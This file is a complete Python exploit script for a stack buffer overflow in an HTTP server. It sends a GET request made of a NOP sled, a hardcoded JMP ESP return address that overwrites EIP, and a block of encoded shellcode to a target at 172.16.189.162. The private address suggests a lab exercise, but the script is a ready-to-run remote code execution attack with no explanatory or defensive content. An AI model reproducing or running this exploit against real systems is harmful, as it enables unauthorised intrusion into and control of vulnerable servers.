#!/usr/bin/python
import socket

target_address="172.16.189.162"
target_port=80

# JMP ESP @ 7C9D30D7

buffer = "GET "
buffer+= "\x90" * 1787
buffer+= "\xD7\x30\x9D\x7C" # overwrite EIP to 7C9D30D7
buffer+= "\x90" * 16
buffer+= (
"\xbb\xa3\x29\x35\x99\xdb\xde\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\xf9\x27\xd7\x6c\x01\xdf\x95"
"\x8f\xf9\x20\xfa\x06\x1c\x11\x3a\x7c\x55\x02\x8a\xf6\x3b\xaf"
"\x61\x5a\xaf\x24\x07\x73\xc0\x8d\xa2\xa5\xef\x0e\x9e\x96\x6e"
"\x8d\xdd\xca\x50\xac\x2d\x1f\x91\xe9\x50\xd2\xc3\xa2\x1f\x41"
"\xf3\xc7\x6a\x5a\x78\x9b\x7b\xda\x9d\x6c\x7d\xcb\x30\xe6\x24"
"\xcb\xb3\x2b\x5d\x42\xab\x28\x58\x1c\x40\x9a\x16\x9f\x80\xd2"
"\xd7\x0c\xed\xda\x25\x4c\x2a\xdc\xd5\x3b\x42\x1e\x6b\x3c\x91"
"\x5c\xb7\xc9\x01\xc6\x3c\x69\xed\xf6\x91\xec\x66\xf4\x5e\x7a"
"\x20\x19\x60\xaf\x5b\x25\xe9\x4e\x8b\xaf\xa9\x74\x0f\xeb\x6a"
"\x14\x16\x51\xdc\x29\x48\x3a\x81\x8f\x03\xd7\xd6\xbd\x4e\xb0"
"\x1b\x8c\x70\x40\x34\x87\x03\x72\x9b\x33\x8b\x3e\x54\x9a\x4c"
"\x40\x4f\x5a\xc2\xbf\x70\x9b\xcb\x7b\x24\xcb\x63\xad\x45\x80"
"\x73\x52\x90\x07\x23\xfc\x4b\xe8\x93\xbc\x3b\x80\xf9\x32\x63"
"\xb0\x02\x99\x0c\x5b\xf9\x4a\x9f\x8c\xbc\x2f\xb7\xae\xbe\x2e"
"\xf3\x26\x58\x5a\x13\x6f\xf3\xf3\x8a\x2a\x8f\x62\x52\xe1\xea"
"\xa5\xd8\x06\x0b\x6b\x29\x62\x1f\x1c\xd9\x39\x7d\x8b\xe6\x97"
"\xe9\x57\x74\x7c\xe9\x1e\x65\x2b\xbe\x77\x5b\x22\x2a\x6a\xc2"
"\x9c\x48\x77\x92\xe7\xc8\xac\x67\xe9\xd1\x21\xd3\xcd\xc1\xff"
"\xdc\x49\xb5\xaf\x8a\x07\x63\x16\x65\xe6\xdd\xc0\xda\xa0\x89"
"\x95\x10\x73\xcf\x99\x7c\x05\x2f\x2b\x29\x50\x50\x84\xbd\x54"
"\x29\xf8\x5d\x9a\xe0\xb8\x6e\xd1\xa8\xe9\xe6\xbc\x39\xa8\x6a"
"\x3f\x94\xef\x92\xbc\x1c\x90\x60\xdc\x55\x95\x2d\x5a\x86\xe7"
"\x3e\x0f\xa8\x54\x3e\x1a")
buffer+= " HTTP/1.1\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()

